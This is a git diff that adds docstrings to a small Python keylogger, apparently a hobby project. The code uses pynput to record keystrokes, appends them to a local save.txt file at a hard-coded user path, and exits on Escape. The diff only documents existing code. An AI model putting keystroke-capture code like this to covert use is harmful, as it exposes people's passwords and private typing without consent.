@@ -11,6 +11,9 @@ count = 0
 keys = []
 
 def press(key): # Left these as Comments because it prints <255> continuously.
+    '''
+    Code for key presses.
+    '''
     global keys, count
     keys.append(key)
     #count += 1
@@ -21,6 +24,9 @@ def press(key): # Left these as Comments because it prints <255> continuously.
     #    save(keys) 
 
 def save(keys):
+    '''
+    Saves the key presses to a save.txt file.
+    '''
     with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Projects\completed\keylogger\save.txt", "a") as file:
         for key in keys:
             key = str(key).replace("'", "")
@@ -33,8 +39,11 @@ def save(keys):
 
 
 def release(key):
+    '''
+    Exits the program if you press Escape.
+    '''
     if key == Key.esc:
         return False
-
+    
 with Listener(on_press=press, on_release=release) as listener:
     listener.join()
